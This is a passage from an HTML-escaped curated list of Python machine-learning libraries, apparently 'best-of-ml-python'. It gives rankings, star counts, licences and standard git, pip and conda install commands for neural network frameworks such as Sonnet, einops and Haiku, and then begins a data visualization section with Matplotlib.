(🥉31 · ⭐ 9.3K) - TensorFlow-based neural network library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepmind/sonnet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 53 · 🔀 1.3K · 📦 840 · 📋 180 - 13% open · ⏱️ 07.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepmind/sonnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dm-sonnet&#34;&gt;PyPi&lt;/a&gt; (📥 22K / month · 📦 52 · ⏱️ 27.03.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dm-sonnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sonnet&#34;&gt;Conda&lt;/a&gt; (📥 14K · ⏱️ 14.11.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sonnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/arogozhnikov/einops&#34;&gt;einops&lt;/a&gt;&lt;/b&gt; (🥉31 · ⭐ 5.1K) - Deep learning operations reinvented (for pytorch, tensorflow, jax and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/arogozhnikov/einops&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 220 · 📦 2.8K · 📋 110 - 29% open · ⏱️ 01.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/arogozhnikov/einops&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/einops&#34;&gt;PyPi&lt;/a&gt; (📥 3.2M / month · 📦 200 · ⏱️ 04.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install einops&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/einops&#34;&gt;Conda&lt;/a&gt; (📥 16K · ⏱️ 04.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge einops&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/clab/dynet&#34;&gt;dyNET&lt;/a&gt;&lt;/b&gt; (🥉31 · ⭐ 3.3K) - DyNet: The Dynamic Neural Network Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/clab/dynet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 160 · 🔀 700 · 📥 5.8K · 📦 210 · 📋 920 - 28% open · ⏱️ 11.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/clab/dynet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dyNET&#34;&gt;PyPi&lt;/a&gt; (📥 23K / month · 📦 28 · ⏱️ 21.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dyNET&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/dm-haiku&#34;&gt;Haiku&lt;/a&gt;&lt;/b&gt; (🥉31 · ⭐ 1.9K) - JAX-based neural network library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepmind/dm-haiku&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 61 · 🔀 150 · 📦 440 · 📋 160 - 22% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepmind/dm-haiku&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dm-haiku&#34;&gt;PyPi&lt;/a&gt; (📥 96K / month · 📦 30 · ⏱️ 14.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dm-haiku&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dm-haiku&#34;&gt;Conda&lt;/a&gt; (📥 2.7K · ⏱️ 14.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dm-haiku&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/amaiya/ktrain&#34;&gt;ktrain&lt;/a&gt;&lt;/b&gt; (🥉31 · ⭐ 1K) - ktrain is a Python library that makes deep learning and AI more.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/amaiya/ktrain&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 240 · 📦 290 · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/amaiya/ktrain&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ktrain&#34;&gt;PyPi&lt;/a&gt; (📥 27K / month · 📦 3 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ktrain&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sony/nnabla&#34;&gt;Neural Network Libraries&lt;/a&gt;&lt;/b&gt; (🥉30 · ⭐ 2.5K) - Neural Network Libraries. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sony/nnabla&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 66 · 🔀 320 · 📥 540 · 📋 80 - 41% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/sony/nnabla&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nnabla&#34;&gt;PyPi&lt;/a&gt; (📥 3.6K / month · 📦 53 · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nnabla&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/skorch-dev/skorch&#34;&gt;skorch&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 4.5K) - A scikit-learn compatible neural network library that wraps.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/skorch-dev/skorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 49 · 🔀 300 · 📦 510 · 📋 440 - 11% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/skorch-dev/skorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/skorch&#34;&gt;PyPi&lt;/a&gt; (📥 23K / month · 📦 33 · ⏱️ 31.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install skorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/skorch&#34;&gt;Conda&lt;/a&gt; (📥 550K · ⏱️ 30.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge skorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/neural-tangents&#34;&gt;Neural Tangents&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.8K) - Fast and Easy Infinite Neural Networks in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/neural-tangents&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 200 · 📥 230 · 📦 36 · 📋 120 - 35% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/neural-tangents&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/neural-tangents&#34;&gt;PyPi&lt;/a&gt; (📥 2.6K / month · 📦 1 · ⏱️ 23.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install neural-tangents&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/XiaoMi/mace&#34;&gt;mace&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 4.6K) - MACE is a deep learning inference framework optimized for mobile.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/XiaoMi/mace&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 63 · 🔀 800 · 📥 1.4K · 📋 670 - 7% open · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/XiaoMi/mace&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nubank/fklearn&#34;&gt;fklearn&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.4K) - fklearn: Functional Machine Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nubank/fklearn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 43 · 🔀 160 · 📦 12 · 📋 45 - 51% open · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nubank/fklearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fklearn&#34;&gt;PyPi&lt;/a&gt; (📥 7.1K / month · ⏱️ 30.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fklearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/towhee-io/towhee&#34;&gt;Towhee&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 500) - A framework that provides a simple API for developing ML-driven data.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/towhee-io/towhee&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 89 · 📥 17 · 📋 340 - 13% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/towhee-io/towhee&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/towhee&#34;&gt;PyPi&lt;/a&gt; (📥 450 / month · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install towhee&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/objax&#34;&gt;Objax&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 690) - Objax is a machine learning framework that provides an Object.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/objax&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 59 · 📦 21 · 📋 100 - 43% open · ⏱️ 18.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/objax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/objax&#34;&gt;PyPi&lt;/a&gt; (📥 260 / month · 📦 2 · ⏱️ 31.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install objax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/neoml-lib/neoml&#34;&gt;NeoML&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 680) - Machine learning framework for both deep learning and traditional.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/neoml-lib/neoml&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 31 · 🔀 110 · 📋 71 - 38% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/neoml-lib/neoml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/neoml&#34;&gt;PyPi&lt;/a&gt; (📥 320 / month · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install neoml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Xtra-Computing/thundersvm&#34;&gt;ThunderSVM&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1.4K) - ThunderSVM: A Fast SVM Library on GPUs and CPUs. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Xtra-Computing/thundersvm&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 34 · 🔀 190 · 📥 2.4K · 📋 210 - 29% open · ⏱️ 09.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Xtra-Computing/thundersvm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/thundersvm&#34;&gt;PyPi&lt;/a&gt; (📥 890 / month · ⏱️ 13.03.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install thundersvm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/serengil/chefboost&#34;&gt;chefboost&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 330 · 📈) - A Lightweight Decision Tree Framework supporting regular.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/serengil/chefboost&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 87 · 📦 23 · 📋 29 - 17% open · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/serengil/chefboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/chefboost&#34;&gt;PyPi&lt;/a&gt; (📥 760 / month · ⏱️ 16.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install chefboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/poets-ai/elegy&#34;&gt;elegy&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 370) - A High Level API for Deep Learning in JAX. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/poets-ai/elegy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 24 · 📋 96 - 31% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/poets-ai/elegy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/elegy&#34;&gt;PyPi&lt;/a&gt; (📥 600 / month · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install elegy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 13 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/davisking/dlib&#34;&gt;dlib&lt;/a&gt;&lt;/b&gt; (🥈38 · ⭐ 11K) - A toolkit for making real world machine learning and data analysis.. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=BSL-1.0&#34;&gt;❗️BSL-1.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tflearn/tflearn&#34;&gt;TFlearn&lt;/a&gt;&lt;/b&gt; (🥉32 · ⭐ 9.6K · 💀) - Deep learning library featuring a higher-level API for TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/CNTK&#34;&gt;CNTK&lt;/a&gt;&lt;/b&gt; (🥉31 · ⭐ 17K · 💀) - Microsoft Cognitive Toolkit (CNTK), an open source deep-learning toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Lasagne/Lasagne&#34;&gt;Lasagne&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 3.8K · 💀) - Lightweight library to build and train neural networks in Theano. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mindsdb/mindsdb&#34;&gt;MindsDB&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 7K) - In-Database Machine Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/numenta/nupic&#34;&gt;NuPIC&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 6.3K · 💀) - Numenta Platform for Intelligent Computing is an implementation.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/shogun-toolbox/shogun&#34;&gt;SHOGUN&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 2.9K · 💀) - Unified and efficient Machine Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aksnzhy/xlearn&#34;&gt;xLearn&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 3K · 💀) - High performance, easy-to-use, and scalable machine learning (ML).. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/itdxer/neupy&#34;&gt;NeuPy&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 710 · 💀) - NeuPy is a Tensorflow based python library for prototyping and building.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/NervanaSystems/neon&#34;&gt;neon&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 3.9K · 💀) - Intel Nervana reference deep learning framework committed to best.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorchbearer/torchbearer&#34;&gt;Torchbearer&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 630 · 💀) - torchbearer: A model fitting library for PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Xtra-Computing/thundergbm&#34;&gt;ThunderGBM&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 620 · 💀) - ThunderGBM: Fast GBDTs and Random Forests on GPUs. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/StarSpace&#34;&gt;StarSpace&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 3.8K · 💀) - Learning embeddings for classification, retrieval and ranking. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Data Visualization&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;General-purpose and task-specific data visualization libraries.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/matplotlib/matplotlib&#34;&gt;Matplotlib&lt;/a&gt;&lt;/b&gt; (🥇49 · ⭐ 16K) - matplotlib: plotting with Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/35wkF7y&#34;&gt;Python-2.0&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/matplotlib/matplotlib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.4K · 🔀 6.4K · 📦 560K · 📋 8.9K - 20% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/matplotlib/matplotlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a 